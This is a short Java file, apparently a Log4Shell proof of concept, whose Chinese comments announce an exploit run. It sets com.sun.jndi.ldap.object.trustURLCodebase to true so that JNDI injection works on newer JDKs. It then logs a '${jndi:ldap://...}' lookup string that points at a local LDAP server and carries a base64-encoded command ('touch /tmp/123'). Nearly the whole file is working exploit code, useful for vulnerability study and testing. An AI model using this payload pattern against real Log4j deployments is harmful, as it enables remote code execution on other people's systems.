import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4j {
    private static final Logger logger = LogManager.getLogger(Log4j.class);

    public static void main(String[] args) {
        //dG91Y2ggL3RtcC8xMjM 是touch /tmp/123的base64编码
        System.out.println("开始执行漏洞利用");
        //高版本的jdk默认trustURLCodebase为false，因此不能成功利用JNDI注入，将trustURLCodebase设置为true后就可以成功利用
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
        logger.error("${jndi:ldap://127.0.0.1:12344/Basic/Command/Base64/dG91Y2ggL3RtcC8xMjM}");
        System.out.println("利用完成");
    }
}